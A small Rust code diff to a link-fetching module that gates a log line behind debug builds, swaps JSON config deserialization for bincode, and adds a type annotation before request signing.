@@ -45,6 +45,7 @@ pub enum Lk {
 }
 impl Lk {
     pub fn print_link_compact(&self) {
+        #[cfg(debug_assertions)]
         info!("{:?}", serde_json::to_string(self).unwrap_or_default());
     }
 
@@ -69,7 +70,7 @@ impl Lk {
             ),
         };
         debug!("{}", encrypt_string!("deserialized data"));
-        let newconfig: CCC = match serde_json::from_slice(&data) {
+        let newconfig: CCC = match bincode::deserialize(&data) {
             Ok(newconfig) => newconfig,
             Err(error) => bail!(
                 "{}{}{}{}",
@@ -552,7 +553,7 @@ impl LinkFetch for LHP {
             sign_bytes: vec![],
         };
 
-        let sign_data = format!("{}", serde_json::to_string(&post_data).unwrap_or_default());
+        let sign_data: String = format!("{}", serde_json::to_string(&post_data).unwrap_or_default());
         let sig: signature::Signature = key_pair.sign(sign_data.as_bytes());
         let sign_bytes = sig.as_ref().to_vec();
         post_data.peer_public_key_bytes = peer_public_key_bytes;
